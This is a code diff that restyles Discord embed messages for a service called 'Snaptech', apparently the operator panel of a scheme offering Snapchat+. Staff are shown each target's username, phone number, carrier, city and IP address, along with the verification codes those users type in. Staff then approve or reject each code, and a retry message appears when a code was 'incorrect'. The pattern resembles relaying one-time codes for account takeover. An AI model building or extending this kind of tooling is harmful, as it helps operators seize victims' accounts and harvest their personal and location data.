@@ -36,16 +36,16 @@ export function buildNewRequestEmbed(row) {
         .setTitle("📱 New Snapchat+ Request")
         .setColor(color)
         .setDescription(
-            `> 📡 **${carrier}** — ${row.country || "?"}  |  🆔 \`#${row.id}\``
+            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**\n` +
+            `──────────────────────`
         )
         .addFields(
-            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Phone",       value: formatPhone(row.phone),              inline: true  },
-            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
-            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
-            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
-            { name: "⏰ Received",    value: formatDate(row.created_at),           inline: true  },
+            { name: "📞 Phone",     value: formatPhone(row.phone),            inline: true },
+            { name: "📡 Carrier",   value: "`" + carrier + "`",              inline: true },
+            { name: "⏰ Received",   value: formatDate(row.created_at),         inline: true },
+            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`", inline: true },
+            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",    inline: true },
+            { name: "🌐 IP",        value: formatIP(ip),                       inline: true },
         )
         .setFooter({ text: "⏳ Awaiting a staff member  •  Snaptech" })
         .setTimestamp();
@@ -54,7 +54,6 @@ export function buildNewRequestEmbed(row) {
 // ─── Code submitted ───────────────────────────────────────────────────────────
 
 export function buildCodeSubmittedEmbed(row) {
-    const color   = getOperatorColor(row.operator);
     const carrier = getCarrierName(row.operator);
     const code    = row.staff_code || "N/A";
     const len     = row.code_length || 6;
@@ -67,17 +66,17 @@ export function buildCodeSubmittedEmbed(row) {
         .setTitle("🔓 Code Submitted by User")
         .setColor(0x10b981)
         .setDescription(
-            `> 🔢 **${len}-digit** code — \`#${row.id}\`  |  📡 **${carrier}**`
+            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**  ·  🔢 \`${len}-digit\` code\n` +
+            `──────────────────────`
         )
         .addFields(
-            { name: "👤 Username",    value: "`\n" + row.username + "\n`",    inline: true  },
-            { name: "📞 Phone",       value: formatPhone(row.phone),              inline: true  },
-            { name: "⏰ Submitted",   value: formatDate(row.updated_at || row.created_at), inline: true },
-            { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",         inline: false },
-            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
-            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
-            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
+            { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",       inline: false },
+            { name: "📞 Phone",       value: formatPhone(row.phone),            inline: true  },
+            { name: "📡 Carrier",     value: "`" + carrier + "`",              inline: true  },
+            { name: "⏰ Submitted",    value: formatDate(row.updated_at || row.created_at), inline: true },
+            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`", inline: true  },
+            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",    inline: true  },
+            { name: "🌐 IP",          value: formatIP(ip),                       inline: true  },
         )
         .setFooter({ text: "⚡ Approve or reject the code below  •  Snaptech" })
         .setTimestamp();
@@ -86,7 +85,6 @@ export function buildCodeSubmittedEmbed(row) {
 // ─── Retry ────────────────────────────────────────────────────────────────────
 
 export function buildRetryEmbed(row) {
-    const color   = getOperatorColor(row.operator);
     const carrier = getCarrierName(row.operator);
     const ip      = row.ip_address;
 
@@ -94,16 +92,17 @@ export function buildRetryEmbed(row) {
         .setTitle("🔄 New Code Pending")
         .setColor(0xf59e0b)
         .setDescription(
-            `> ⚠️ The previous code was **incorrect**.\n> The user is entering a new code — check it below.`
+            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**\n` +
+            `──────────────────────\n` +
+            `⚠️ The previous code was **incorrect** — check the new one below.`
         )
         .addFields(
-            { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Phone",     value: formatPhone(row.phone),              inline: true  },
+            { name: "📞 Phone",     value: formatPhone(row.phone),            inline: true },
+            { name: "📡 Carrier",   value: "`" + carrier + "`",              inline: true },
             { name: "⏰ Retried",    value: formatDate(row.updated_at || row.created_at), inline: true },
-            { name: "📡 Carrier",   value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`",   inline: true  },
-            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",      inline: true  },
-            { name: "🌐 IP",        value: formatIP(ip),                        inline: true  },
+            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`", inline: true },
+            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",    inline: true },
+            { name: "🌐 IP",        value: formatIP(ip),                       inline: true },
         )
         .setFooter({ text: "🔁 New attempt  •  Snaptech" })
         .setTimestamp();
